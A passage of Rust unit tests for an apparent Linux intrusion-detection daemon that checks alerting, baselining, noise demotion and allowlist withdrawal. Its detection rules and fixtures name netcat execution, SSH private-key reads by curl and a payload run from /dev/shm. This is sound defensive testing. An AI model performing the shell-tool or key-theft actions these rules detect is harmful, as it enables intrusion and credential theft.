            .find(|a| a.rule == "moat-pkg-subtree-netcat-exec")
            .unwrap_or_else(|| panic!("no netcat alert for pid {}", pid2));
        assert_eq!(a2.action_taken, "none", "monitor mode never kills");
        assert!(std::path::Path::new(&format!("/proc/{}", pid2)).exists());
        let _ = child2.kill();
        let _ = child2.wait();
    }

    /// A binary executed from a file descriptor has no name in the kernel. The
    /// alert must not just say `/proc/self/fd/9` and stop.
    #[test]
    fn a_proc_self_fd_binary_is_resolved_and_the_substitution_is_evidence() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());

        // Route 1: the hook carries the exec'd file (linux_binprm).
        d.handle_line(r#"{"process_exec":{"process":{"exec_id":"f-sh","pid":700,"uid":1000,"binary":"/usr/bin/sh","arguments":"/tmp/.x9k --quiet","start_time":"2026-09-03T16:20:00.000000000Z"}}}"#);
        d.handle_line(r#"{"process_lsm":{"process":{"exec_id":"f-fd","pid":701,"uid":1000,"binary":"/proc/self/fd/9","arguments":"","cwd":"/tmp","start_time":"2026-09-03T16:21:00.000000000Z","parent_exec_id":"f-sh"},"function_name":"bprm_check_security","policy_name":"moat-exec-untrusted-tmpfs","args":[{"linux_binprm_arg":{"path":"/dev/shm/payload"}}]},"time":"2026-09-03T16:21:00.100Z"}"#);

        let a = d.store.load().into_iter().next().expect("one alert");
        assert_eq!(a.process.exe, "/dev/shm/payload");
        let note = a
            .explain
            .evidence
            .iter()
            .find(|e| e.contains("/proc/self/fd/9"))
            .expect("the substitution must be evidence");
        assert!(note.contains("exec'd-file argument"), "{}", note);

        // Route 2: no hook argument, so the parent's argument 0 is used.
        let dir2 = tempfile::tempdir().unwrap();
        let (mut d2, _) = dev_daemon(dir2.path());
        d2.handle_line(r#"{"process_exec":{"process":{"exec_id":"g-sh","pid":800,"uid":1000,"binary":"/usr/bin/sh","arguments":"/tmp/.x9k --quiet","start_time":"2026-09-03T16:20:00.000000000Z"}}}"#);
        d2.handle_line(r#"{"process_exec":{"process":{"exec_id":"g-fd","pid":801,"uid":1000,"binary":"/proc/self/fd/9","arguments":"","cwd":"/tmp","start_time":"2026-09-03T16:21:00.000000000Z","parent_exec_id":"g-sh"}}}"#);
        assert_eq!(d2.table.get("g-fd").unwrap().exe, "/tmp/.x9k");
        assert!(d2
            .table
            .get("g-fd")
            .unwrap()
            .exe_note
            .as_ref()
            .unwrap()
            .contains("parent's argument 0"));
    }

    #[test]
    fn status_has_every_contract_field() {
        let dir = tempfile::tempdir().unwrap();
        let (d, _) = dev_daemon(dir.path());
        let s = d.status();
        for k in [
            "ok", "version", "mode", "tetragon", "policies", "policies_failed", "feeds",
            "unacked", "ledger", "sandbox", "socket_group",
        ] {
            assert!(s.get(k).is_some(), "status missing {}", k);
        }
        assert_eq!(s["socket_group"], "moat");
        assert!(s["unacked"].get("critical").is_some());
        // CONTRACT §5: three plainly named populations, and `needs_you` is
        // `unacked` as one number — the two must never be able to disagree.
        for k in ["needs_you", "recorded", "suppressed", "signal"] {
            assert!(s["ledger"].get(k).is_some(), "ledger missing {}", k);
        }
        let unacked: u64 = ["critical", "high", "medium", "low"]
            .iter()
            .map(|k| s["unacked"][k].as_u64().unwrap_or(0))
            .sum();
        assert_eq!(s["ledger"]["needs_you"].as_u64(), Some(unacked));
    }

    #[test]
    fn state_json_is_written_and_mode_survives_a_restart() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, cfg) = dev_daemon(dir.path());
        d.mode = "enforce".into();
        d.write_state();
        assert!(cfg.paths.state_file().exists());
        let d2 = Daemon::new(cfg.clone(), &dir.path().join("moat.toml")).unwrap();
        assert_eq!(d2.mode, "enforce");
    }

    /// A retuned threshold is runtime state, like `mode` and `contain`.
    ///
    /// It has to survive a restart from state.json rather than from moat.toml,
    /// because moatd does not rewrite a file the user (or their config
    /// management) also owns — and a tuning that quietly reverts on the next
    /// boot is worse than one that was refused, since nothing announces it.
    #[test]
    fn a_retuned_threshold_survives_a_restart_and_a_corrupt_value_does_not() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, cfg) = dev_daemon(dir.path());
        let shipped = d.cfg.thresholds.ransom_churn_files;
        d.set_threshold("ransom_churn_files", 20).unwrap();

        let d2 = Daemon::new(cfg.clone(), &dir.path().join("moat.toml")).unwrap();
        assert_eq!(d2.cfg.thresholds.ransom_churn_files, 20);

        // Validated on the way back IN, not only on the way out: a hand-edited
        // or corrupt state.json must not be able to set a number the socket
        // would have refused. 10_000 is "the rule is off" wearing a tuning's
        // clothes, and `status` would go on listing the rule as on.
        let mut state: Value =
            serde_json::from_str(&std::fs::read_to_string(cfg.paths.state_file()).unwrap()).unwrap();
        state["threshold_overrides"]["ransom_churn_files"] = json!(10_000);
        state["threshold_overrides"]["no_such_threshold"] = json!(1);
        std::fs::write(
            cfg.paths.state_file(),
            serde_json::to_string(&state).unwrap(),
        )
        .unwrap();

        let d3 = Daemon::new(cfg.clone(), &dir.path().join("moat.toml")).unwrap();
        assert_eq!(
            d3.cfg.thresholds.ransom_churn_files, shipped,
            "an out-of-bounds override is dropped, not honoured"
        );
        assert!(!d3.threshold_overrides.contains_key("no_such_threshold"));
    }

    // ================================================================
    // Baselining (docs/BASELINE.md, docs/LEARNING-AND-ANALYSIS.md §1)
    // ================================================================

    /// One exec line, with the parent already in the table.
    fn exec_line(id: &str, pid: u32, exe: &str, args: &str, parent: &str) -> String {
        format!(
            r#"{{"process_exec":{{"process":{{"exec_id":"{}","pid":{},"uid":1000,"binary":"{}","arguments":"{}","cwd":"/home/dan/proj","start_time":"2026-09-03T16:21:06.900000000Z"{}}}}}}}"#,
            id,
            pid,
            exe,
            args,
            if parent.is_empty() {
                String::new()
            } else {
                format!(r#","parent_exec_id":"{}""#, parent)
            }
        )
    }

    fn read_line(id: &str, pid: u32, exe: &str, args: &str, parent: &str, policy: &str, path: &str) -> String {
        format!(
            r#"{{"process_lsm":{{"process":{{"exec_id":"{}","pid":{},"uid":1000,"binary":"{}","arguments":"{}","cwd":"/home/dan/proj","start_time":"2026-09-03T16:21:06.900000000Z","parent_exec_id":"{}"}},"function_name":"file_post_open","policy_name":"{}","args":[{{"file_arg":{{"path":"{}"}}}},{{"int_arg":4}}]}},"time":"2026-09-03T16:21:07.000Z"}}"#,
            id, pid, exe, args, parent, policy, path
        )
    }

    #[test]
    fn every_alert_carries_actor_context_rarity_and_a_surface() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        replay(&mut d);
        for a in d.store.load() {
            assert!(!a.severity_base.is_empty(), "{} has no severity_base", a.rule);
            assert!(!a.severity_reason.is_empty(), "{} has no severity_reason", a.rule);
            assert!(
                a.surface == "alerts" || a.surface == "timeline",
                "{} has surface {:?}",
                a.rule,
                a.surface
            );
            assert!(!a.rarity_text.is_empty(), "{} has no rarity sentence", a.rule);
            // BASELINE §5: only high and critical reach the Alerts tab ON THEIR
            // OWN. A member of a chain that reached `high` is the exception,
            // and it is not a silent one -- the alert carries the `chain` that
            // raised it, so a reader working from alerts.jsonl alone can see
            // exactly why a `low` is on the badge.
            if a.surface == "alerts" {
                let raised_by_chain = a
                    .chain
                    .as_ref()
                    .is_some_and(|c| crate::alert::severity_rank(&c.severity) >= 2);
                assert!(
                    a.severity_rank() >= 2 || raised_by_chain,
                    "{} is {} on the Alerts tab with no chain to justify it",
                    a.rule,
                    a.severity
                );
                // ...and nothing already answered for reaches it at all. The
                // recorded surface is the only thing a reader working from
                // alerts.jsonl alone has (an offline audit, the setup screen),
                // so it has to agree with what the UI shows rather than relying
                // on every consumer to recompute it.
                assert!(
                    a.suppressed_by.is_none(),
                    "{} is suppressed by {:?} but recorded on the Alerts tab",
                    a.rule,
                    a.suppressed_by
                );
            }
            let ev = a.explain.evidence.join("\n");
            assert!(ev.contains("actor: "), "{} has no actor evidence", a.rule);
            assert!(ev.contains("context: "), "{} has no context evidence", a.rule);
            assert!(ev.contains("rarity: "), "{} has no rarity evidence", a.rule);
        }
    }

    /// The interpreter rule, end to end: official `/usr/bin/sh` running a
    /// dropped script is a `user` actor, so nothing is softened.
    #[test]
    fn an_interpreter_takes_its_provenance_from_the_script_it_was_handed() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.handle_line(&exec_line("e-term", 100, "/usr/bin/alacritty", "", ""));
        d.handle_line(&exec_line("e-sh", 101, "/usr/bin/sh", "/home/dan/proj/setup.sh", "e-term"));
        d.handle_line(&read_line(
            "e-sh",
            101,
            "/usr/bin/sh",
            "/home/dan/proj/setup.sh",
            "e-term",
            "moat-cred-ssh-private-key-read",
            "/home/dan/.ssh/id_ed25519_moat_fixture",
        ));
        let a = d
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == "moat-cred-ssh-private-key-read")
            .expect("an alert");
        assert_eq!(a.actor.provenance, crate::provenance::Provenance::User);
        assert_eq!(a.actor.script.as_deref(), Some("/home/dan/proj/setup.sh"));
        assert!(a.actor.package.is_none());
        // And the timeline groups on the script, not on /usr/bin/sh.
        assert_eq!(a.group_key(), "/home/dan/proj/setup.sh");
        // cred never earns a provenance downgrade; interactive takes one step.
        assert_eq!(a.context, crate::context::Context::Interactive);
        assert_eq!(a.severity_base, "high");
        assert_eq!(a.severity, "medium");
    }

    #[test]
    fn rarity_moves_from_first_seen_to_common_as_the_same_thing_recurs() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.thresholds.dedupe_secs = 0; // one alert per event, not one per minute
        d.handle_line(&exec_line("e-term", 100, "/usr/bin/alacritty", "", ""));
        for i in 0..5 {
            d.handle_line(&read_line(
                "e-restic",
                200 + i,
                "/usr/bin/restic",
                "backup",
                "e-term",
                "moat-cred-ssh-private-key-read",
                "/home/dan/.ssh/id_ed25519_moat_fixture",
            ));
        }
        // ULIDs minted in the same millisecond are not ordered among
        // themselves, so assert on the set rather than on the sequence.
        let alerts: Vec<Alert> = d
            .store
            .load()
            .into_iter()
            .filter(|a| a.rule == "moat-cred-ssh-private-key-read")
            .collect();
        assert_eq!(alerts.len(), 5, "dedupe is off for this test");
        let seen: Vec<&str> = alerts.iter().map(|a| a.rarity.as_str()).collect();
        assert_eq!(seen.iter().filter(|r| **r == "first_seen").count(), 1);
        assert!(seen.contains(&"rare"));
        assert!(seen.contains(&"common"), "{:?}", seen);
        // The sentence names the actor and the place, in words.
        let common = alerts.iter().find(|a| a.rarity.is_common()).unwrap();
        assert!(common.rarity_text.contains("/usr/bin/restic has read /home/dan/.ssh"), "{}", common.rarity_text);
        assert!(common.rarity_text.contains("seen "), "{}", common.rarity_text);
        let first = alerts.iter().find(|a| a.rarity == crate::rarity::Rarity::FirstSeen).unwrap();
        assert!(first.rarity_text.starts_with("first time "), "{}", first.rarity_text);
        assert!(!d.rarity.is_empty(), "the (actor, file dir) tuple is counted");
    }

    /// Feed the same official, medium pattern on three distinct days and it
    /// lands in baseline.toml and starts suppressing itself.
    #[test]
    fn the_learning_window_writes_a_baseline_entry_and_it_takes_effect() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, cfg) = dev_daemon(dir.path());
        d.cfg.thresholds.dedupe_secs = 0;
        assert!(d.baseline.learning(util::unix_secs()));

        // `restic` is official in the fixture, so a medium cred read from it is
        // exactly the shape §3 learns. A unit test cannot wait three days, so
        // the tuple's day list is back-dated between emissions; everything else
        // (rarity, provenance, severity, the write) is the real path.
        let path = cfg.paths.baseline_allowlist();
        let key = crate::baseline::tuple_key(
            "moat-cred-ssh-private-key-read",
            "/usr/bin/restic",
            "",
            "/home/dan/.ssh",
        );
        let restic_read = || {
            let mut f = Finding::new(
                "moat-cred-ssh-private-key-read",
                crate::policy::PolicyMeta::fallback("moat-cred-ssh-private-key-read"),
                ProcInfo {
                    exec_id: "e-restic".into(),
                    pid: 300,
                    uid: 0,
                    exe: "/usr/bin/restic".into(),
                    args: "backup".into(),
                    cwd: "/".into(),
                    start_time: util::now_rfc3339(),
                    parent_exec_id: None,
                    exited_at: None,
                    exit_signal: None,
                    exe_note: None,
            in_container: None,
                    sid: None,
                    tty: None,
                    ..Default::default()
                },
            );
            f.meta.family = "cred".into();
            f.meta.severity = "medium".into();
            f.hook = "file_post_open".into();
            f.hook_detail = Some("read".into());
            f.file = Some(crate::alert::FileRef {
                path: "/home/dan/.ssh/id_ed25519_moat_fixture".into(),
                sha256: None,
            });
            f
        };
        // Three sightings: still `rare`, and only one distinct day.
        for _ in 0..3 {
            d.emit(restic_read());
        }
        assert!(!path.exists(), "not yet: one day, and the tuple is still rare");
        // Back-date two earlier days; the next sighting is the third distinct
        // day and the fourth sighting, which makes the tuple `common`.
        d.baseline.state.tuples.get_mut(&key).unwrap().days =
            vec!["2026-08-01".into(), "2026-08-02".into()];
        d.emit(restic_read());
        assert!(path.exists(), "baseline.toml must have been written");
        let text = std::fs::read_to_string(&path).unwrap();
        assert!(text.contains("# learned "), "{}", text);
        assert!(text.contains("3 distinct days"), "{}", text);
        assert!(text.contains("moat-cred-ssh-private-key-read"), "{}", text);
        assert!(text.contains("file = \"/home/dan/.ssh/*\""), "{}", text);
        assert_eq!(d.baseline.learned_entries().len(), 1);

        // It is live: the next identical event is recorded as suppressed.
        d.reload_allowlist();
        let n = d.alerts_suppressed;
        d.handle_line(&read_line(
            "e-r2",
            301,
            "/usr/bin/restic",
            "backup",
            "",
            "moat-cred-ssh-private-key-read",
            "/home/dan/.ssh/id_ed25519_moat_fixture",
        ));
        assert!(d.alerts_suppressed > n, "the learned entry suppresses it");
        let last = d.store.load().into_iter().next_back().unwrap();
        assert_eq!(last.suppressed_by.as_deref(), Some("baseline.toml#1"));
    }

    /// After the window the same pattern is a proposal in state.json instead.
    #[test]
    fn after_the_window_a_recurring_pattern_shows_up_in_status_as_a_proposal() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.baseline.state.learning_until = 1; // the window is long closed
        let now = util::unix_secs();
        for day in 0..3u64 {
            d.baseline.observe(&Observation {
                rule: "moat-persist-hypr-config-write",
                exe: "/usr/bin/restic",
                parent: "/usr/bin/Hyprland",
                dir: "/home/dan/.config/hypr",
                severity: "low",
                severity_base: "low",
                provenance: "official",
                package: Some("restic 0.18.1-1".into()),
                context: "service",
                rarity: "common",
                suppressed: false,
                demoted: false,
                ts: format!("2026-09-0{}T10:00:00.000Z", day + 1),
                now,
            });
        }
        let s = d.status();
        assert_eq!(s["baseline"]["learning"], false);
        assert_eq!(s["baseline"]["proposals"], 1);
        let p = &s["proposals"][0];
        for k in ["id", "rule", "exe", "parent", "dir", "count", "days", "first_seen", "last_seen", "toml"] {
            assert!(p.get(k).is_some(), "proposal has no {}", k);
        }
        assert_eq!(p["days"], 3);
        assert!(p["toml"].as_str().unwrap().contains("[[rule]]"));
    }

    /// The retroactive half of a demotion is the daemon's, and it is scoped
    /// exactly as the demotion is: the pattern's earlier alerts leave the
    /// badge, another pattern of the same rule does not, and a step a `high`
    /// chain re-surfaced is not silenced by a noise count.
    #[test]
    fn a_demotion_quietens_the_backlog_it_covers_and_nothing_else() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.thresholds.dedupe_secs = 0;
        // This test is about the noise guard, not about provenance. Since
        // provenance applies AFTER the context matrix (2026-09-05), the fixture
        // actor `/usr/bin/restic` is official under the pacman test db and its
        // `persist` alerts score medium — off the badge, never counted by the
        // guard, and the test would be measuring the wrong mechanism.
        d.cfg.baseline.provenance_downgrade = false;
        d.handle_line(&exec_line("e-hypr", 1, "/usr/bin/Hyprland", "", ""));
        // A different pattern of the same rule, on the badge before the flood.
        // Same actor, different directory: a different (rule, exe, parent,
        // dir) tuple, and so a different pattern to the noise guard.
        d.handle_line(&read_line(
            "e-other",
            300,
            "/usr/bin/restic",
            "backup",
            "e-hypr",
            "moat-persist-hypr-config-write",
            "/home/dan/.config/hypr/conf.d/extra.conf",
        ));
        let other = d
            .store
            .load()
            .into_iter()
            .find(|a| a.file.as_ref().is_some_and(|f| f.path.contains("conf.d")))
            .expect("the conf.d alert");
        assert_eq!(other.surface, "alerts", "precondition: on the badge");

        for i in 0..25u32 {
            d.handle_line(&read_line(
                &format!("e-w{}", i),
                400 + i,
                "/usr/bin/restic",
                "backup",
                "e-hypr",
                "moat-persist-hypr-config-write",
                &format!("/home/dan/.config/hypr/gen{}.conf", i % 4),
            ));
        }
        assert_eq!(
            d.baseline.demoted_pattern_count(),
            1,
            "one pattern flooded, not the rule"
        );
        let alerts = d.store.load();
        let flood: Vec<_> = alerts
            .iter()
            .filter(|a| a.file.as_ref().is_some_and(|f| f.path.contains("/hypr/gen")))
            .collect();
        assert!(flood.len() > 20);
        for a in &flood {
            assert_eq!(a.surface, "timeline", "{} raised before the demotion is quiet after it", a.id);
        }
        let vim = alerts.iter().find(|a| a.id == other.id).unwrap();
        assert_eq!(vim.surface, "alerts", "the other pattern is untouched");

        // What the panel counts and what the daemon counts are now the same
        // set, with no list to consult.
        let waiting: Vec<_> = alerts
            .iter()
            .filter(|a| a.rule == "moat-persist-hypr-config-write" && !a.acked && a.surface == "alerts")
            .collect();
        assert_eq!(waiting.len(), 1);
        assert_eq!(waiting[0].id, vim.id);
        // The guard's own announcement is medium, so it is on the timeline and
        // not in this number either.
        assert_eq!(d.store.unacked()["high"], 1);
    }

    /// `status.unacked`, the watchdog's "N alerts waiting", and the panel's
    /// badge all answer one question. Two of them had their own filter.
    #[test]
    fn status_unacked_and_the_watchdog_count_the_same_thing() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.thresholds.dedupe_secs = 0;
        d.handle_line(&exec_line("e-sh", 1, "/usr/bin/bash", "", ""));
        // Two on the badge, one timelined by a triage demotion, one medium
        // (timeline by severity), one suppressed.
        for (i, path) in ["/home/dan/.ssh/id_ed25519_moat_fixture", "/home/dan/.ssh/id_rsa_moat_fixture"].iter().enumerate() {
            d.handle_line(&read_line(
                &format!("e-k{}", i), 500 + i as u32, "/usr/bin/curl", "", "e-sh",
                "moat-cred-ssh-private-key-read", path,
            ));
        }
        d.handle_line(&read_line(
            "e-t", 510, "/usr/bin/curl", "", "e-sh",
            "moat-cred-ssh-private-key-read", "/home/dan/.ssh/id_ecdsa_moat_fixture",
        ));
        let timelined = d.store.load().into_iter().rfind(|a| a.surface == "alerts").unwrap();
        d.mark(&timelined.id, "surface", Value::from("timeline")).unwrap();

        let s = d.status();
        let status_total: u64 = ["critical", "high", "medium", "low"]
            .iter()
            .map(|k| s["unacked"][k].as_u64().unwrap_or(0))
            .sum();
        let badge = d
            .store
            .load()
            .iter()
            .filter(|a| !a.acked && !a.is_suppressed() && a.surface == "alerts")
            .count() as u64;
        assert_eq!(status_total, badge, "status.unacked is the badge, not every unacked record");
        assert!(badge >= 2, "precondition");
        // And the record the daemon itself timelined is not "unacked" anywhere.
        assert!(d.store.load().iter().any(|a| !a.acked && a.surface == "timeline"));
    }

    /// BASELINE §4: a flooding rule is demoted, one alert explains it, and the
    /// demoted alerts stay on the timeline **without** being suppressed.
    #[test]
    fn a_flooding_rule_is_demoted_and_says_so_exactly_once() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.thresholds.dedupe_secs = 0;
        // See `a_demotion_quietens_the_backlog_it_covers_and_nothing_else`:
        // `/usr/bin/restic` is official under the test pacman db, so with the
        // provenance step on these alerts never reach the badge and the noise
        // guard — the thing under test — never counts them.
        d.cfg.baseline.provenance_downgrade = false;
        d.handle_line(&exec_line("e-hypr", 1, "/usr/bin/Hyprland", "", ""));
        for i in 0..25u32 {
            d.handle_line(&read_line(
                &format!("e-w{}", i),
                400 + i,
                "/usr/bin/restic",
                "backup",
                "e-hypr",
                "moat-persist-hypr-config-write",
                &format!("/home/dan/.config/hypr/gen{}.conf", i % 4),
            ));
        }
        // One shape flooding demotes that shape, not the whole rule -- which is
        // the point: another shape of this rule stays on the badge.
        assert_eq!(d.baseline.demoted_pattern_count(), 1);
        assert!(d
            .baseline
            .demoted_rules()
            .contains(&"moat-persist-hypr-config-write".to_string()));
        assert_eq!(
            d.status()["demoted_rules"].as_array().unwrap().len(),
            1,
            "demoted_rules is a top-level status field"
        );

        let alerts = d.store.load();
        let noisy: Vec<_> = alerts
            .iter()
            .filter(|a| a.rule == crate::rules::NOISY_RULE)
            .collect();
        assert_eq!(noisy.len(), 1, "one alert about the flood, not one per alert");
        let n = noisy[0];
        assert_eq!(n.severity, "medium");
        assert!(n.explain.evidence.iter().any(|e| e.starts_with("top 1: ")));
        let scopes: Vec<&str> = n.explain.if_expected.options.iter().map(|o| o.scope.as_str()).collect();
        assert!(scopes.contains(&"these-are-expected"), "{:?}", scopes);
        assert!(scopes.contains(&"keep-watching"), "{:?}", scopes);
        let expected = n
            .explain
            .if_expected
            .options
            .iter()
            .find(|o| o.scope == "these-are-expected")
            .unwrap();
        assert!(expected.line.contains("moat-persist-hypr-config-write"));
        assert!(n
            .explain
            .if_expected
            .options
            .iter()
            .any(|o| o.cmd.contains("baseline undemote moat-persist-hypr-config-write")));

        // Later alerts of the demoted rule: timeline, but NOT suppressed.
        d.handle_line(&read_line(
            "e-after",
            999,
            "/usr/bin/restic",
            "backup",
            "e-hypr",
            "moat-persist-hypr-config-write",
            "/home/dan/.config/hypr/after.conf",
        ));
        let last = d
            .store
            .load()
            .into_iter()
            .rfind(|a| a.rule == "moat-persist-hypr-config-write")
            .unwrap();
        assert_eq!(last.surface, "timeline");
        assert_eq!(last.suppressed_by, None, "a demoted rule is not a suppression");
        assert!(last.explain.evidence.iter().any(|e| e.contains("noise guard")));
    }

    /// LEARNING §1: a learned entry whose actor stops being official is
    /// disabled in place, with a reason and a low alert.
    /// An entry learned BEFORE the interpreter gate is withdrawn on re-check.
    ///
    /// Provenance alone can never withdraw it: `python3` does not stop being
    /// official, which is exactly why the entry was wrong. Without this, every
    /// grant written before 2026-09-08 stays on disk, keeps matching, and keeps
    /// covering scripts nobody observed.
    #[test]
    fn a_learned_interpreter_entry_is_withdrawn_even_though_it_is_still_official() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());

        // Write the entry directly: the gate now refuses to create one, so the
        // only way to have it is to have had it already.
        for day in 0..3u64 {
            d.baseline.observe(&Observation {
                rule: "moat-cred-ssh-private-key-read",
                exe: "/usr/bin/python3.14",
                parent: "",
                dir: "/home/dan/.ssh",
                severity: "medium",
                severity_base: "medium",
                provenance: "official",
                package: Some("python 3.14-1".into()),
                context: "service",
                rarity: "common",
                suppressed: false,
                demoted: false,
                ts: format!("2026-09-0{}T10:00:00.000Z", day + 1),
                now: util::unix_secs(),
            });
        }
        // The gate refused, so force the state an older build would have left.
        let key = d.baseline.state.tuples.keys().next().unwrap().clone();
        d.baseline.state.tuples.get_mut(&key).unwrap().learned = true;
        d.baseline.state.learned.insert(
            key.clone(),
            crate::baseline::LearnedEntry {
                key: key.clone(),
                rule: "moat-cred-ssh-private-key-read".into(),
                exe: "/usr/bin/python3.14".into(),
                written: util::now_rfc3339(),
                revoked: None,
                accepted_by: None,
            },
        );
        assert_eq!(d.baseline.learned_entries().len(), 1, "the old-build state");

        assert_eq!(d.revoke_stale_learned_entries(), 1, "it must be withdrawn");
        assert!(d.baseline.learned_entries().is_empty());
        // FOR THE RIGHT REASON. Without a pacman fixture this exe also fails
        // the provenance re-check, so `is_empty()` alone passes with the
        // interpreter branch deleted -- it did, on the first attempt.
        let why = d.baseline.state.learned[&key]
            .revoked
            .clone()
            .expect("revoked with a reason");
        assert!(
            why.contains("runs code chosen by its arguments"),
            "withdrawn, but not for naming a runtime instead of the code: {}",
            why
        );
    }

    /// The re-check is part of STARTUP, not only of a pacman transaction.
    ///
    /// `on_pacman_change` acts only when the database mtime moved, and a fresh
    /// process takes the current mtime as its baseline. So an entry that a new
    /// rule would refuse to write today survived on disk, matching, until some
    /// unrelated transaction happened to move the file -- which for a rule
    /// change is never, because a rule change is not a filesystem event. An
    /// upgrade that fixes what moat is willing to learn has to fix what it
    /// already learned, or it silently does nothing on every existing machine.
    #[test]
    fn a_stale_learned_entry_is_withdrawn_at_startup_without_a_pacman_transaction() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let key = "k-startup".to_string();
        d.baseline.state.learned.insert(
            key.clone(),
            crate::baseline::LearnedEntry {
                key: key.clone(),
                rule: "moat-cred-ssh-private-key-read".into(),
                exe: "/usr/bin/python3.14".into(),
                written: util::now_rfc3339(),
                revoked: None,
                accepted_by: None,
            },
        );
        assert_eq!(d.baseline.learned_entries().len(), 1);

        // No mtime moved; nothing touched the pacman database. Only a start.
        d.on_start(util::unix_secs());

        let why = d.baseline.state.learned[&key].revoked.clone();
        assert!(
            why.as_deref()
                .map(|w| w.contains("runs code chosen by its arguments"))
                .unwrap_or(false),
            "startup did not re-check the learned set: {:?}",
            why
        );
    }

    /// An approval recorded only on DISK still counts.
    ///
    /// `accepted_by` was added on 2026-09-09; every entry written before it
    /// deserialises as None, which would make a person's approval look like
    /// something the learner wrote and expose it to the runtime-path
    /// withdrawal. `accept` has always written "accepted by <who>" into the
    /// block's comment, so the record survived even though the field did not.
    #[test]
    fn an_old_approval_is_recovered_from_the_block_comment() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, cfg) = dev_daemon(dir.path());
        for day in 0..3u64 {
            d.baseline.observe(&Observation {
                rule: "moat-cred-ssh-private-key-read",
                exe: "/usr/bin/python3.14",
                parent: "",
                dir: "/home/dan/.ssh",
                severity: "medium",
                severity_base: "medium",
                provenance: "official",
                package: Some("python 3.14-1".into()),
                context: "service",
                rarity: "common",
                suppressed: false,
                demoted: false,
                ts: format!("2026-09-0{}T10:00:00.000Z", day + 1),
                now: util::unix_secs(),
            });
        }
        let key = d.baseline.state.tuples.keys().next().unwrap().clone();
        let spec = d.baseline.state.tuples[&key].spec();
        let path = cfg.paths.baseline_allowlist();
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        // The shape an older moat left behind: the approval in the COMMENT and
        // nothing in the state file.
        std::fs::write(
            &path,
            format!(
                "# learned on 2026-09-01 — accepted by dan
{}",
                crate::allowlist::render_block(&spec)
            ),
        )
        .unwrap();
        d.baseline.state.learned.insert(
            key.clone(),
            crate::baseline::LearnedEntry {
                key: key.clone(),
                rule: "moat-cred-ssh-private-key-read".into(),
                exe: "/usr/bin/python3.14".into(),
                written: util::now_rfc3339(),
                revoked: None,
                accepted_by: None,
            },
        );

        d.revoke_stale_learned_entries();

        let why = d.baseline.state.learned[&key].revoked.clone();
        assert!(
            why.as_deref()
                .map(|w| !w.contains("runs code chosen by its arguments"))
                .unwrap_or(true),
            "an approval recorded on disk was overruled: {:?}",
            why
        );
        assert_eq!(
            d.baseline.state.learned[&key].accepted_by.as_deref(),
            Some("dan"),
            "and the field is backfilled so the next pass does not have to re-read the file"
        );
    }

    /// A human's approval is not moat's to revisit.
    ///
    /// `Baseline::accept` puts a reviewed proposal into the same collection as
    /// an automatically learned entry. The runtime-path withdrawal added on
    /// 2026-09-08 could therefore disable one a person had read and approved --
    /// a heuristic added later overruling a decision already made.
    #[test]
    fn an_accepted_proposal_is_not_withdrawn_by_the_runtime_path_rule() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let key = "k-accepted".to_string();
        d.baseline.state.learned.insert(
            key.clone(),
            crate::baseline::LearnedEntry {
                key: key.clone(),
                rule: "moat-cred-ssh-private-key-read".into(),
                exe: "/usr/bin/python3.14".into(),
                written: util::now_rfc3339(),
                revoked: None,
                accepted_by: Some("dan".into()),
            },
        );
        d.revoke_stale_learned_entries();
        // It MAY still be revoked -- this fixture has no pacman database, so
        // python3.14 is not official and the provenance rule withdraws it, which
        // is the pre-existing behaviour and correct. What must not happen is
        // withdrawal for the RUNTIME-PATH reason, which is the rule a person's
        // approval outranks.
        let why = d.baseline.state.learned[&key].revoked.clone();
        assert!(
            why.as_deref()
                .map(|w| !w.contains("runs code chosen by its arguments"))
                .unwrap_or(true),
            "a heuristic overruled a person's approval: {:?}",
            why
        );
    }

    /// A withdrawal that did not happen must not be recorded as one.
    ///
    /// `mark_revoked` takes the entry out of `learned_entries`, so the next
    /// re-check never retries it. If the on-disk block is still there, the
    /// grant is still live and moat has written down that it is not. The
    /// provenance path above marks unconditionally; this one does not.
    #[test]
    fn a_failed_withdrawal_is_retried_rather_than_recorded_as_done() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, cfg) = dev_daemon(dir.path());

        // A tuple whose spec really matches a block on disk.
        for day in 0..3u64 {
            d.baseline.observe(&Observation {
                rule: "moat-cred-ssh-private-key-read",
                exe: "/usr/bin/python3.14",
                parent: "",
                dir: "/home/dan/.ssh",
                severity: "medium",
                severity_base: "medium",
                provenance: "official",
                package: Some("python 3.14-1".into()),
                context: "service",
                rarity: "common",
                suppressed: false,
                demoted: false,
                ts: format!("2026-09-0{}T10:00:00.000Z", day + 1),
                now: util::unix_secs(),
            });
        }
        let key = d.baseline.state.tuples.keys().next().unwrap().clone();
        let spec = d.baseline.state.tuples[&key].spec();
        let path = cfg.paths.baseline_allowlist();
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(&path, format!("# learned\n{}", crate::allowlist::render_block(&spec)))
            .unwrap();
        assert!(
            matches!(crate::allowlist::find_index(&path, &spec), Ok(Some(_))),
            "precondition: the block is findable, or this tests the wrong branch"
        );

        d.baseline.state.learned.insert(
            key.clone(),
            crate::baseline::LearnedEntry {
                key: key.clone(),
                rule: "moat-cred-ssh-private-key-read".into(),
                exe: "/usr/bin/python3.14".into(),
